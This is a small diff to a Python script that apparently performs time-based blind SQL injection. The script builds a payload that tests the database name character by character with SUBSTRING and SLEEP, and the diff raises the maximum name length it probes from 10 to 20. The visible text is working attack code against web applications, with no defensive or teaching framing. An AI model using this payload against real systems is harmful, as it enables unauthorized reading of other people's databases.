@@ -24,7 +24,7 @@ base_payload = "' OR IF(SUBSTRING((SELECT DATABASE()),{},1)='{}', SLEEP(0.1), 0)
 
 # Characters to test for the database name
 characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
-max_length = 10  # Adjust based on expected length of database name
+max_length = 20  # Adjust based on expected length of database name
 
 def test_character(position, character, result, index):
     payload = base_payload.format(position, character)
